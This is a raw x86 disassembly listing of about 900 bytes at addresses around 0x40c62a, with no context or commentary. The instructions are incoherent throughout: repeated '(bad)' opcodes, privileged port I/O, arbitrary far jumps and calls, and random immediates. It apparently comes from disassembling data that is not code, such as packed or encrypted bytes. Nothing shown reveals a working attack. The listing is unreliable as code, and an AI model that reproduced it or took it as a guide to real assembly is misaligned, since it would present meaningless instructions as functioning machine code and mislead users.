  40c62a:	je     0x40c67d
  40c62c:	adc    ebx,DWORD PTR [edx+0x3e2935d7]
  40c632:	(bad)  
  40c633:	fcomp  QWORD PTR [ebx+0x5ba65d53]
  40c639:	mov    edi,0x7e92c6f3
  40c63e:	pushf  
  40c63f:	push   esi
  40c640:	dec    esi
  40c641:	add    eax,0xad89b997
  40c646:	loopne 0x40c67c
  40c648:	fwait
  40c649:	rcl    DWORD PTR [esi],cl
  40c64b:	mov    ds:0xaae2cf69,eax
  40c650:	xchg   edi,eax
  40c651:	into   
  40c652:	test   eax,0x8e0e9539
  40c657:	jp     0x40c67e
  40c659:	and    DWORD PTR [eax-0x1a1b2993],ebx
  40c65f:	xchg   edi,eax
  40c660:	pop    esp
  40c661:	pusha  
  40c662:	and    dh,BYTE PTR [edi+0xa]
  40c665:	call   0x6f466b6e
  40c66a:	dec    edx
  40c66b:	shl    DWORD PTR [edx+0x7f],1
  40c66e:	push   cs
  40c66f:	jns    0x40c64d
  40c671:	and    bh,0x82
  40c674:	mov    ds:0xf487d205,al
  40c679:	dec    ebp
  40c67a:	addr16 lock inc ebp
  40c67d:	mov    esp,0x8f27741e
  40c682:	push   ebp
  40c683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c684:	or     al,0xaf
  40c686:	mov    BYTE PTR [ebx],bh
  40c688:	xor    al,0x26
  40c68a:	dec    esi
  40c68b:	jg     0x40c674
  40c68d:	inc    eax
  40c68e:	dec    edx
  40c68f:	sub    DWORD PTR [edi+0x29],ebx
  40c692:	mov    ecx,0xeb75f459
  40c697:	xor    ebp,DWORD PTR fs:[ecx-0x4c]
  40c69b:	addr16 xchg ecx,eax
  40c69d:	out    0xee,eax
  40c69f:	fnstenv [edi+eax*4+0x7acadde9]
  40c6a6:	xor    bl,bl
  40c6a8:	lods   eax,DWORD PTR ds:[esi]
  40c6a9:	aas    
  40c6aa:	js     0x40c712
  40c6ac:	mov    ah,0x20
  40c6ae:	add    ebp,ecx
  40c6b0:	scas   al,BYTE PTR es:[edi]
  40c6b1:	push   esi
  40c6b2:	or     eax,DWORD PTR [edx]
  40c6b4:	test   al,0x15
  40c6b6:	pop    ebp
  40c6b7:	push   es
  40c6b8:	add    eax,DWORD PTR [ebx]
  40c6ba:	pop    ds
  40c6bb:	aad    0x4f
  40c6bd:	inc    BYTE PTR [edi]
  40c6bf:	aam    0x47
  40c6c1:	neg    DWORD PTR [edx-0x40]
  40c6c4:	lahf   
  40c6c5:	cmp    bh,cl
  40c6c7:	fld    TBYTE PTR [eax-0x4c548b53]
  40c6cd:	sub    al,0xa6
  40c6cf:	pop    ecx
  40c6d0:	adc    eax,0x35836f08
  40c6d5:	mov    al,0x25
  40c6d7:	lock xchg DWORD PTR [edi+esi*2],ebx
  40c6db:	test   DWORD PTR [esi+0x2c],ebp
  40c6de:	mov    cl,0xdd
  40c6e0:	pop    ecx
  40c6e1:	add    eax,0xb0e37453
  40c6e6:	loope  0x40c702
  40c6e8:	mov    dl,0x2f
  40c6ea:	fcom   DWORD PTR [edi+0x37332ea7]
  40c6f0:	push   esi
  40c6f1:	out    dx,al
  40c6f2:	jge    0x40c728
  40c6f4:	jns    0x40c722
  40c6f6:	and    DWORD PTR ds:0xa9a2a13c,edx
  40c6fc:	test   eax,0xe3010011
  40c701:	mov    ebp,DWORD PTR [ebx+edx*4]
  40c704:	call   0x94ac5dc2
  40c709:	and    al,0xf9
  40c70b:	push   esi
  40c70c:	jmp    0x40c754
  40c70e:	push   ebp
  40c70f:	jo     0x40c6e2
  40c711:	addr16 jne 0x40c6cd
  40c714:	mov    WORD PTR [edi],gs
  40c716:	pop    es
  40c717:	xchg   edi,eax
  40c718:	mov    ah,0x34
  40c71a:	adc    edi,edx
  40c71c:	adc    eax,0x13a77751
  40c721:	mov    ebp,0x17850b27
  40c726:	xor    edi,edx
  40c728:	enter  0x8526,0x1b
  40c72c:	scas   al,BYTE PTR es:[edi]
  40c72d:	in     al,0xde
  40c72f:	mov    ch,BYTE PTR [edx-0x766a3d17]
  40c735:	lea    ecx,[ebx]
  40c737:	rcl    edi,cl
  40c739:	push   ss
  40c73a:	mov    al,ds:0xf3c32027
  40c73f:	sub    ebp,DWORD PTR [ebp-0xf839db3]
  40c745:	es jg  0x40c76f
  40c748:	popf   
  40c749:	pop    ds
  40c74a:	ret    0x24b1
  40c74d:	cmp    al,0x36
  40c74f:	inc    ecx
  40c750:	dec    esp
  40c751:	ret    0x376f
  40c754:	lods   al,BYTE PTR ds:[esi]
  40c755:	pop    esp
  40c756:	popf   
  40c757:	mov    esi,DWORD PTR [eax]
  40c759:	inc    ebp
  40c75a:	ja     0x40c7bb
  40c75c:	xor    BYTE PTR [esi-0x47],bl
  40c75f:	or     eax,0x7e8b6537
  40c764:	xchg   ebx,eax
  40c765:	sbb    dl,BYTE PTR [edi]
  40c767:	dec    edx
  40c768:	cli    
  40c769:	cld    
  40c76a:	and    BYTE PTR [ebp-0x3c36f4a2],dl
  40c770:	dec    edx
  40c771:	pop    esi
  40c772:	dec    ebx
  40c773:	inc    DWORD PTR [edi+0x1]
  40c776:	or     BYTE PTR [eax],bh
  40c778:	ss retf 0x1a72
  40c77c:	ja     0x40c753
  40c77e:	mov    ecx,0x4cd7d1fd
  40c783:	xchg   edi,eax
  40c784:	les    ebx,FWORD PTR [esi-0x3ec03f8a]
  40c78a:	sti    
  40c78b:	cmp    DWORD PTR [esi-0x4b],esp
  40c78e:	xchg   edx,edi
  40c790:	fistp  WORD PTR [esi-0x2c034348]
  40c796:	inc    ebp
  40c797:	xchg   ebx,eax
  40c798:	jne    0x40c72b
  40c79a:	jmp    0x5786:0x37888f2a
  40c7a1:	std    
  40c7a2:	mov    edx,0x9bce9b33
  40c7a7:	and    DWORD PTR [eax],ebp
  40c7a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7aa:	mov    cl,0x94
  40c7ac:	mov    dl,0xf
  40c7ae:	dec    ebp
  40c7af:	(bad)  
  40c7b0:	push   ebx
  40c7b1:	imul   ecx,DWORD PTR [ebx-0x11],0xffffff92
  40c7b5:	jl     0x40c75a
  40c7b7:	cmp    DWORD PTR [eax-0x52],esi
  40c7ba:	cmc    
  40c7bb:	ins    DWORD PTR es:[edi],dx
  40c7bc:	push   cs
  40c7bd:	or     dh,bh
  40c7bf:	ja     0x40c800
  40c7c1:	mov    ds:0xa2e606c5,al
  40c7c6:	sbb    eax,0xf5417c0c
  40c7cb:	rol    DWORD PTR [ecx+0x4214cd19],0x1d
  40c7d2:	stc    
  40c7d3:	sbb    DWORD PTR [ebx],ecx
  40c7d5:	pop    esp
  40c7d6:	cmp    eax,0xf8be0547
  40c7db:	pop    ebx
  40c7dc:	je     0x40c796
  40c7de:	and    DWORD PTR [edx-0x4f],esi
  40c7e1:	dec    eax
  40c7e2:	add    ah,BYTE PTR [eax-0x4]
  40c7e5:	dec    esi
  40c7e6:	xor    BYTE PTR [esi+0x42cf078a],0x96
  40c7ed:	mov    ebp,0x8d5bc56d
  40c7f2:	cmp    al,0xdb
  40c7f4:	test   al,0xb8
  40c7f6:	enter  0xbbed,0x46
  40c7fa:	xchg   ebx,eax
  40c7fb:	and    BYTE PTR [edx+0x6f6a843b],ah
  40c801:	inc    edi
  40c802:	mov    ecx,0x28e44d10
  40c807:	dec    esp
  40c808:	add    ah,BYTE PTR [ebp-0x2]
  40c80b:	test   BYTE PTR [ebx],dl
  40c80d:	push   cs
  40c80e:	in     al,0xf2
  40c810:	mov    BYTE PTR [esi],dl
  40c812:	lods   eax,DWORD PTR ds:[esi]
  40c813:	aam    0x6a
  40c815:	ss dec edx
  40c817:	push   ss
  40c818:	ins    DWORD PTR es:[edi],dx
  40c819:	sub    BYTE PTR [eax-0x7c44e06],dl
  40c81f:	push   0x46
  40c821:	or     al,0xb7
  40c823:	aam    0x25
  40c825:	sub    al,0x7
  40c827:	test   BYTE PTR [esi],dl
  40c829:	lea    ebx,[eax-0x18]
  40c82c:	and    BYTE PTR [ecx-0x70],al
  40c82f:	mov    ch,0x45
  40c831:	jns    0x40c7e3
  40c833:	aad    0xa8
  40c835:	popa   
  40c836:	dec    esi
  40c837:	es hlt 
  40c839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c83a:	scas   eax,DWORD PTR es:[edi]
  40c83b:	push   0xc
  40c83d:	dec    ebp
  40c83e:	stos   DWORD PTR es:[edi],eax
  40c83f:	adc    cl,BYTE PTR [edx+edx*8+0x68]
  40c843:	iret   
  40c844:	popa   
  40c845:	outs   dx,DWORD PTR ds:[esi]
  40c846:	sub    BYTE PTR [edi-0x32],0xd5
  40c84a:	clc    
  40c84b:	cmp    cl,dl
  40c84d:	rcl    ch,1
  40c84f:	jae    0x40c842
  40c851:	or     BYTE PTR [ecx-0x68b91469],0x12
  40c858:	shl    BYTE PTR [bp+si-0x4f],0x5d
  40c85d:	icebp  
  40c85e:	pop    ebp
  40c85f:	jo     0x40c89e
  40c861:	mov    esi,0x572adcc0
  40c866:	ja     0x40c7ec
  40c868:	push   ecx
  40c869:	push   eax
  40c86a:	mov    ecx,0xce16a225
  40c86f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c870:	or     eax,0xeb71d24c
  40c875:	jno    0x40c876
  40c877:	enter  0xf1c7,0xba
  40c87b:	les    eax,FWORD PTR [eax+0xe470db1]
  40c881:	lea    edx,[edi]
  40c883:	adc    dl,BYTE PTR [edi-0x51631789]
  40c889:	adc    eax,0xf2194d35
  40c88e:	xor    DWORD PTR [esi],ecx
  40c890:	add    eax,0x14c763eb
  40c895:	ins    BYTE PTR es:[edi],dx
  40c896:	stc    
  40c897:	dec    edx
  40c898:	imul   ebp,ebx,0x3
  40c89b:	and    ebp,DWORD PTR [eax-0x3b]
  40c89e:	add    al,0x57
  40c8a0:	or     DWORD PTR [eax],esp
  40c8a2:	xchg   esi,eax
  40c8a3:	jle    0x40c8ac
  40c8a5:	mov    ch,0x4a
  40c8a7:	jecxz  0x40c8bd
  40c8a9:	sbb    BYTE PTR [ebx],ah
  40c8ab:	xchg   DWORD PTR [eax+0x2d],ebp
  40c8ae:	fldcw  WORD PTR ds:0x9b726eb3
  40c8b4:	(bad)  
  40c8b5:	xor    ch,al
  40c8b7:	ret    
  40c8b8:	popf   
  40c8b9:	add    eax,0x6c57ac3c
  40c8be:	xor    eax,DWORD PTR [esi+0x251d5e46]
  40c8c4:	mov    ds:0x2755bcf0,eax
  40c8c9:	call   0x21258c1b
  40c8ce:	mov    dh,0xf
  40c8d0:	xor    bh,al
  40c8d2:	lods   eax,DWORD PTR ds:[esi]
  40c8d3:	push   ebx
  40c8d4:	nop
  40c8d5:	lds    eax,FWORD PTR [ebx]
  40c8d7:	xor    al,0x57
  40c8d9:	mov    BYTE PTR [eax+0x77e03ac],cl
  40c8df:	adc    al,0x86
  40c8e1:	mov    al,0x4a
  40c8e3:	out    0x5,al
  40c8e5:	jmp    0x40c928
  40c8e7:	xchg   esi,eax
  40c8e8:	mov    ds:0x1f8723ea,al
  40c8ed:	mov    ds:0xf65e0caa,al
  40c8f2:	ds inc edx
  40c8f4:	fild   DWORD PTR [ebp+ebp*1+0x2ee38011]
  40c8fb:	dec    ebp
  40c8fc:	bound  esp,QWORD PTR [ecx]
  40c8fe:	clc    
  40c8ff:	inc    esi
  40c900:	rcl    DWORD PTR [edx+ebx*2],1
  40c903:	mov    ecx,0xb4c8f530
  40c908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c909:	(bad)
  40c90c:	xchg   edx,eax
  40c90d:	pop    ecx
  40c90e:	in     eax,dx
  40c90f:	add    BYTE PTR [edx+0x2f49c6e5],ah
  40c915:	jns    0x40c8b8
  40c917:	std    
  40c918:	iret   
  40c919:	outs   dx,BYTE PTR ds:[esi]
  40c91a:	jnp    0x40c8f6
  40c91c:	call   0x8d64:0xe68ef875
  40c923:	sub    al,0xb6
  40c925:	dec    eax
  40c926:	aad    0x2b
  40c928:	push   0x1d253c9c
  40c92d:	fisttp DWORD PTR [ebp+0xa1786b8]
  40c933:	stc    
  40c934:	and    BYTE PTR [edx+esi*4],bh
  40c937:	push   cs
  40c938:	sbb    DWORD PTR [ebp+0x37],esi
  40c93b:	or     al,BYTE PTR [edi+0x3]
  40c93e:	or     DWORD PTR [ecx-0x38],0x4b
  40c942:	inc    esi
  40c943:	mov    edi,0xbcd6394e
  40c948:	mov    edi,0x51271e3c
  40c94d:	dec    edx
  40c94e:	dec    ecx
  40c94f:	repnz sbb BYTE PTR [edx],dl
  40c952:	in     al,dx
  40c953:	inc    esi
  40c954:	xlat   BYTE PTR ds:[ebx]
  40c955:	cmp    dh,BYTE PTR [eax]
  40c957:	mov    esp,0x80c5cc53
  40c95c:	ins    DWORD PTR es:[edi],dx
  40c95d:	in     eax,dx
  40c95e:	pop    ds
  40c95f:	xor    al,0x8c
  40c961:	pop    esp
  40c962:	push   ds
  40c963:	jno    0x40c907
  40c965:	cmp    al,dh
  40c967:	jne    0x40c9be
  40c969:	or     cl,dh
  40c96b:	sbb    eax,DWORD PTR [edx]
  40c96d:	jmp    FWORD PTR [ebx+0x1f]
  40c970:	fld    DWORD PTR [esi+0x52]
  40c973:	push   ebp
  40c974:	std    
  40c975:	mov    dl,BYTE PTR [ebp+0x53]
  40c978:	add    eax,0x93178a13
  40c97d:	cli    
  40c97e:	mov    esi,0xa8e925ee
  40c983:	and    ah,BYTE PTR [eax+esi*2-0x6a]
  40c987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c988:	in     eax,dx
  40c989:	xchg   edi,eax
  40c98a:	rcl    ax,cl
  40c98d:	push   cs
  40c98e:	inc    esi
  40c98f:	aad    0xd1
  40c991:	push   0xc126204f
  40c996:	xlat   BYTE PTR ds:[ebx]
  40c997:	fidiv  DWORD PTR [ecx+eiz*2+0x3bc82f49]
  40c99e:	add    BYTE PTR [ebx+edi*2],bl
  40c9a1:	inc    ebp
  40c9a2:	inc    esp
  40c9a3:	pop    esp
  40c9a4:	sub    al,0x40
  40c9a6:	adc    bh,bh
  40c9a8:	(bad)
  40c9ac:	sbb    DWORD PTR [esi],ebp
  40c9ae:	pop    ebx
  40c9af:	repnz (bad) 
  40c9b1:	clc    
  40c9b2:	rcl    DWORD PTR [esi+0x37],1
  40c9b5:	or     esp,esp
  40c9b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9b8:	jne    0x40c9c0
  40c9ba:	mov    dl,0x30
  40c9bc:	mov    BYTE PTR [ecx],ah
  40c9be:	(bad)  
  40c9bf:	repz jl 0x40c99d
  40c9c2:	sti    
  40c9c3:	sahf   
  40c9c4:	shr    DWORD PTR [ecx+eiz*2+0x415fc369],0x7d
  40c9cc:	cs dec ebp
  40c9ce:	pop    eax
  40c9cf:	dec    si
  40c9d1:	mov    ds:0x33809d62,al
  40c9d6:	fld    DWORD PTR [edx]
  40c9d8:	cmovle esi,DWORD PTR [edi-0x6d7df508]
  40c9df:	sub    al,dl
  40c9e1:	and    al,0xc1
  40c9e3:	and    bh,BYTE PTR [edi+edx*1-0x62f64c9]
  40c9ea:	ja     0x40ca3b
  40c9ec:	xor    al,0x22
  40c9ee:	loopne 0x40ca69
  40c9f0:	dec    edi
  40c9f1:	les    eax,FWORD PTR [edx+0x5f]
  40c9f4:	push   ds
  40c9f5:	add    al,0x3e
  40c9f7:	sahf   
  40c9f8:	adc    esi,DWORD PTR [esi+0x5e50ef0]
  40c9fe:	jb     0x40c9c5
  40ca00:	call   0xe9755a96
  40ca05:	jb     0x40ca60
  40ca07:	fisttp QWORD PTR [edi-0x3fa3343a]
  40ca0d:	mov    al,ds:0x52de80d
  40ca12:	(bad)  
  40ca13:	pop    ss
  40ca14:	inc    edi
  40ca15:	dec    ebx
  40ca16:	and    DWORD PTR [ebp+0x1e812784],ecx
  40ca1c:	xor    edx,DWORD PTR [ecx+0x557c4731]
  40ca22:	int    0x6d
  40ca24:	mov    bl,0xe2
  40ca26:	pushf  
  40ca27:	dec    ecx
  40ca28:	test   ecx,esp
  40ca2a:	inc    eax
  40ca2b:	jecxz  0x40ca86
  40ca2d:	rcl    DWORD PTR [esi],1
  40ca2f:	push   esi
  40ca30:	adc    BYTE PTR [ecx],0xdb
  40ca33:	pushf  
  40ca34:	loop   0x40cab4
  40ca36:	mov    sp,0xae47
  40ca3a:	push   ds
  40ca3b:	and    al,BYTE PTR [edi+0x39a8f44e]
  40ca41:	addr16 jmp 0x12ad:0x83c104e4
  40ca49:	and    al,dh
  40ca4b:	push   ss
  40ca4c:	bound  ebx,QWORD PTR [eax+0x531dd308]
  40ca52:	push   0xfffffffe
  40ca54:	sahf   
  40ca55:	push   0x51
  40ca57:	cmc    
  40ca58:	hlt    
  40ca59:	inc    esp
  40ca5a:	sub    BYTE PTR [edx-0x58],ch
  40ca5d:	sbb    BYTE PTR [ecx+0x4438b08c],dl
  40ca63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca64:	(bad)  
  40ca65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca66:	call   0x29b4a126
  40ca6b:	outs   dx,BYTE PTR ds:[esi]
  40ca6c:	das    
  40ca6d:	xchg   esi,eax
  40ca6e:	loop   0x40cae3
  40ca70:	sub    al,0x3f
  40ca72:	fsubr  DWORD PTR [esi+0x1ba0c8f6]
  40ca78:	add    al,0x45
  40ca7a:	imul   ebx,DWORD PTR [bp+0x7ada],0x522291d2
  40ca83:	fdivr  st,st(7)
  40ca85:	cld    
  40ca86:	and    BYTE PTR [esi],dl
  40ca88:	mov    al,ds:0x95949b7a
  40ca8d:	jg     0x40cb0a
  40ca8f:	data16 adc al,0x9e
  40ca92:	mov    WORD PTR [ebx],?
  40ca94:	inc    esi
  40ca95:	pop    esp
  40ca96:	dec    esi
  40ca97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca98:	xor    ah,BYTE PTR [ecx+0x4913bce7]
  40ca9e:	lock icebp 
  40caa0:	adc    edx,DWORD PTR [ebx-0x487a727a]
  40caa6:	inc    edi
  40caa7:	pop    ds
  40caa8:	cmp    ecx,ebp
  40caaa:	fwait
  40caab:	mov    ecx,0xfc827709
  40cab0:	and    edx,DWORD PTR [ebx+0x5edefa17]
  40cab6:	enter  0xf4d0,0x5
  40caba:	xor    al,0x56
  40cabc:	mov    esp,0x44070027
  40cac1:	lods   eax,DWORD PTR ds:[esi]
  40cac2:	adc    BYTE PTR [edi+0x715708a8],dl
  40cac8:	xchg   esp,eax
  40cac9:	cdq    
  40caca:	jle    0x40ca62
  40cacc:	inc    esp
  40cacd:	fidivr DWORD PTR [esi+esi*8+0x44]
  40cad1:	push   cs
  40cad2:	ror    DWORD PTR [ecx+0x6373ac12],0xd7
  40cad9:	neg    ah
  40cadb:	lock aas 
  40cadd:	inc    esi
  40cade:	repnz popa 
  40cae0:	nop
  40cae1:	mov    esi,0xb8961525
  40cae6:	pop    ss
  40cae7:	jmp    0x40cb0a
  40cae9:	out    0x62,al
  40caeb:	xchg   ebx,eax
  40caec:	xchg   esi,eax
  40caed:	mov    ds:0x34dacf9,eax
  40caf2:	sub    al,0x18
  40caf4:	sbb    al,0x97
  40caf6:	adc    al,0x5b
  40caf8:	cmp    eax,0xb4a44498
  40cafd:	test   ah,bh
  40caff:	test   eax,edx
  40cb01:	pushf  
  40cb02:	and    ebx,DWORD PTR [esi+esi*4+0x79a40be8]
  40cb09:	scas   al,BYTE PTR es:[edi]
  40cb0a:	push   es
  40cb0b:	xchg   edx,eax
  40cb0c:	js     0x40cb40
  40cb0e:	pusha  
  40cb0f:	sbb    edi,DWORD PTR ds:0xf6ad5aa3
  40cb15:	jl     0x40cad5
  40cb17:	and    DWORD PTR [eax-0x41],ecx
  40cb1a:	out    dx,al
  40cb1b:	and    al,0xbf
  40cb1d:	jae    0x40cb3e
  40cb1f:	fiadd  DWORD PTR [edx+esi*1]
  40cb22:	(bad)  
  40cb23:	out    dx,eax
  40cb24:	push   edx
  40cb25:	ins    BYTE PTR es:[edi],dx
  40cb26:	(bad)  
  40cb27:	int    0xe7
  40cb29:	out    0xbe,eax
  40cb2b:	ins    DWORD PTR es:[edi],dx
  40cb2c:	push   edi
  40cb2d:	dec    esp
  40cb2e:	mov    ebp,0x1419c459
  40cb33:	and    BYTE PTR [ecx],dl
  40cb35:	sahf   
  40cb36:	or     BYTE PTR [eax],cl
  40cb38:	bound  eax,QWORD PTR gs:[edx+0x5a1d1f47]
  40cb3f:	sar    BYTE PTR [esi-0x5869e7c7],cl
  40cb45:	pusha  
  40cb46:	jmp    0xe9f1:0x5cc36e58
  40cb4d:	pop    ss
  40cb4e:	sub    DWORD PTR [ebp-0x5f8daf6],eax
  40cb54:	arpl   WORD PTR [ebp+edi*2+0x41bb6352],bx
  40cb5b:	test   eax,0x631b3efb
  40cb60:	cmp    DWORD PTR [ebp-0x78],eax
  40cb63:	rol    DWORD PTR [edi-0x1ad671a1],cl
  40cb69:	xchg   BYTE PTR [esi],al
  40cb6b:	call   0x4658:0xfca3ca1e
  40cb72:	push   0xffffff8a
  40cb74:	mov    edi,0x15828448
  40cb79:	sub    al,0xb8
  40cb7b:	jne    0x40cb1e
  40cb7d:	mov    ecx,DWORD PTR [edi-0xa]
  40cb80:	push   esi
  40cb81:	lods   eax,DWORD PTR ds:[esi]
  40cb82:	push   ebp
  40cb83:	je     0x40cb05
  40cb85:	mov    WORD PTR [ebx+0x3cc221d7],gs
  40cb8b:	add    eax,0x551d68c9
  40cb90:	shr    DWORD PTR [ecx],0x6d
  40cb93:	int    0xbb
  40cb95:	sbb    ch,bh
  40cb97:	(bad)  
  40cb99:	adc    BYTE PTR ds:0x8f94a5a2,bl
  40cb9f:	mov    ebx,edi
  40cba1:	repnz mov WORD PTR [ebp-0x37],ss
  40cba5:	push   ds
  40cba6:	das    
  40cba7:	jae    0x40cb93
  40cba9:	dec    edx
  40cbaa:	mov    esi,0x2701ab01
  40cbaf:	mov    ecx,0x63c3cf81
  40cbb4:	dec    edi
  40cbb5:	out    dx,eax
  40cbb6:	add    ah,BYTE PTR [eax+eax*1-0x506a6d92]
  40cbbd:	add    BYTE PTR [edx+0x7e1cacf2],al
  40cbc3:	paddd  mm0,QWORD PTR [ebp+ecx*8+0x55]
  40cbc8:	cwde   
  40cbc9:	fdivr  DWORD PTR [ecx+0x72]
  40cbcc:	mov    eax,ds:0xa2ad2670
  40cbd1:	dec    ah
  40cbd3:	aas    
  40cbd4:	and    al,0x8
  40cbd6:	sbb    ecx,DWORD PTR ds:[ebp-0x69]
  40cbda:	scas   al,BYTE PTR es:[edi]
  40cbdb:	mov    ebp,0xca3497a5
  40cbe0:	popa   
  40cbe1:	xor    al,BYTE PTR [ecx]
  40cbe3:	(bad)  
  40cbe4:	adc    eax,0x32d6954c
  40cbe9:	dec    edi
  40cbea:	in     al,dx
  40cbeb:	aad    0x99
  40cbed:	mov    ebp,0x30819966
  40cbf2:	add    dl,BYTE PTR [esi]
  40cbf4:	jg     0x40cbb6
  40cbf6:	retf   0xeabd
  40cbf9:	add    al,0x9b
  40cbfb:	push   ebx
  40cbfc:	fwait
  40cbfd:	out    dx,al
  40cbfe:	cmp    edi,DWORD PTR ds:0x8553aea
  40cc04:	inc    eax
  40cc05:	jae    0x40cc56
  40cc07:	bound  edx,QWORD PTR [eax]
  40cc09:	or     esp,DWORD PTR [edi+0x36e73ac7]
  40cc0f:	inc    ebx
  40cc10:	and    BYTE PTR [esi],0x7
  40cc13:	or     eax,ecx
  40cc15:	stc    
  40cc16:	arpl   WORD PTR ds:0xdef78e16,bp
  40cc1c:	pop    ss
  40cc1d:	or     eax,0xce2ef6c2
  40cc22:	imul   esi,DWORD PTR [ebp+0x5f],0xd5826efc
  40cc29:	cmp    eax,0x2c4fe0d5
  40cc2f:	outs   dx,BYTE PTR ds:[esi]
  40cc30:	jo     0x40cbfa
  40cc32:	jno    0x40cc61
  40cc34:	inc    esi
  40cc35:	xor    al,0x9a
  40cc37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc38:	ror    bl,1
  40cc3a:	mov    al,ds:0x92b1aeb
  40cc3f:	jb     0x40cc9a
  40cc41:	xchg   DWORD PTR [ebp-0x7a],ebp
  40cc44:	push   eax
  40cc45:	mov    ss,WORD PTR [eax]
  40cc47:	call   0xf364:0x787e628f
  40cc4e:	or     al,BYTE PTR [eax+ecx*2]
  40cc51:	cmp    al,0xaa
  40cc53:	ds shl dl,cl
  40cc56:	loopne 0x40ccc1
  40cc58:	or     ebx,DWORD PTR [edi-0x75]
  40cc5b:	xor    DWORD PTR [ecx],ebp
  40cc5d:	pop    ds
  40cc5e:	outs   dx,DWORD PTR ds:[esi]
  40cc5f:	mov    esi,0xc8589cde
  40cc64:	sbb    eax,0xa83d50fb
  40cc69:	out    0x94,eax
  40cc6b:	scas   eax,DWORD PTR es:[edi]
  40cc6c:	in     eax,dx
  40cc6d:	ficom  DWORD PTR [ecx+0x23]
  40cc70:	lods   eax,DWORD PTR ds:[esi]
  40cc71:	sub    BYTE PTR [edi+0x21762c5d],dl
  40cc77:	jo     0x40ccef
  40cc79:	pop    eax
  40cc7a:	push   ds
  40cc7b:	es push cs
  40cc7d:	(bad)  
  40cc7e:	cmp    al,0x50
  40cc80:	sub    ebx,esp
  40cc82:	add    eax,0x929998cf
  40cc87:	loope  0x40ccba
  40cc89:	outs   dx,BYTE PTR ds:[esi]
  40cc8a:	mov    eax,0xa88ce15b
  40cc8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc90:	add    dh,BYTE PTR [ecx+0x60]
  40cc93:	mov    edx,DWORD PTR [ebp-0x70]
  40cc96:	sbb    ch,bh
  40cc98:	cmp    BYTE PTR [edx],0x19
  40cc9b:	jecxz  0x40cd10
  40cc9d:	xchg   esp,eax
  40cc9e:	xor    eax,0x9cf28316
  40cca3:	sbb    al,0xd1
  40cca5:	mov    DWORD PTR [esi-0xcf8cdc9],edi
  40ccab:	xchg   edx,eax
  40ccac:	cld    
  40ccad:	or     al,0x39
  40ccaf:	xor    DWORD PTR [edx+0x6c],esp
  40ccb2:	sbb    al,0x62
  40ccb4:	mov    DWORD PTR [edi+0x42],esp
  40ccb7:	cmp    al,0x21
  40ccb9:	repz push ss
  40ccbb:	clc    
  40ccbc:	test   al,0x8b
  40ccbe:	mov    fs,ecx
  40ccc0:	inc    esp
  40ccc1:	mov    WORD PTR [ebp-0x55e68774],es
  40ccc7:	cmp    ch,bl
  40ccc9:	add    BYTE PTR [edx+0x47c9af64],bh
  40cccf:	aad    0xf4
  40ccd1:	ficomp WORD PTR [edx+eiz*4+0x3e]
  40ccd5:	adc    ebp,DWORD PTR [eax-0xde9cce9]
  40ccdb:	mov    BYTE PTR [ecx+0x3094f344],ah
  40cce1:	outs   dx,DWORD PTR ds:[esi]
  40cce2:	pop    ecx
  40cce3:	(bad)  
  40cce4:	push   cs
  40cce5:	pop    ebx
  40cce6:	mov    esi,0xed28ba24
  40cceb:	add    BYTE PTR [esi-0x5a],cl
  40ccee:	push   esi
  40ccef:	cmp    eax,0x87603078
  40ccf4:	jno    0x40ccf3
  40ccf6:	inc    esi
  40ccf7:	mov    al,ds:0xe76340c3
  40ccfc:	pop    ds
  40ccfd:	mov    ebp,0x59409979
  40cd02:	mov    ebp,0xc56159e7
  40cd07:	jmp    0x40cd7d
  40cd09:	sub    BYTE PTR [ebx-0x3a],dl
  40cd0c:	xchg   edi,esi
  40cd0e:	repnz std 
  40cd10:	mov    dh,0xea
  40cd12:	push   0x8921ea8c
  40cd17:	jo     0x40cc9e
  40cd19:	jnp    0x40cce5
  40cd1b:	(bad)  
  40cd1c:	dec    esp
  40cd1d:	mov    bl,0x6d
  40cd1f:	pop    DWORD PTR [ebp+0x5d]
  40cd22:	dec    ebp
  40cd23:	pop    edi
  40cd24:	mov    ch,0x90
  40cd26:	push   ebx
  40cd27:	in     al,dx
  40cd28:	jg     0x40cd8f
  40cd2a:	cwde   
  40cd2b:	or     esi,DWORD PTR [eax+0x7677538c]
  40cd31:	push   ebp
  40cd32:	and    eax,0x8e4f96b6
  40cd37:	in     eax,dx
  40cd38:	mov    ds:0x4b042f83,al
  40cd3d:	jge    0x40cd3c
  40cd3f:	sub    DWORD PTR [ebp-0x57],0xddd092f7
  40cd46:	pop    eax
  40cd47:	xor    ch,ch
  40cd49:	les    ebx,FWORD PTR [edx+0x282383ba]
  40cd4f:	lods   al,BYTE PTR ds:[esi]
  40cd50:	mov    DWORD PTR [esi+0x36],esp
  40cd53:	inc    ebx
  40cd54:	das    
  40cd55:	push   ebx
  40cd56:	jmp    0x40cd56
  40cd58:	jne    0x40cced
  40cd5a:	push   ebp
  40cd5b:	das    
  40cd5c:	xchg   edi,eax
  40cd5d:	lock push eax
  40cd5f:	and    al,0x61
  40cd61:	dec    ecx
  40cd62:	int    0xd7
  40cd64:	or     BYTE PTR [edi],0x2e
  40cd67:	fadd   QWORD PTR [edx+0x46]
  40cd6a:	fcmovnu st,st(5)
  40cd6c:	fs aas 
  40cd6e:	(bad)  
  40cd6f:	jmp    0x8deb5af1
  40cd74:	mov    ds:0xdcbf191,eax
  40cd79:	sbb    eax,0x9021c5c8
  40cd7e:	dec    ecx
  40cd7f:	aad    0xcf
  40cd81:	popa   
  40cd82:	mov    dl,0xdf
  40cd84:	ins    BYTE PTR es:[edi],dx
  40cd85:	shl    DWORD PTR [edx-0x4d695dc1],1
  40cd8b:	(bad)  
  40cd8c:	push   ecx
  40cd8d:	jmp    0x40cde5
  40cd8f:	(bad)  
  40cd90:	stos   BYTE PTR es:[edi],al
  40cd91:	enter  0x8cc7,0xc7
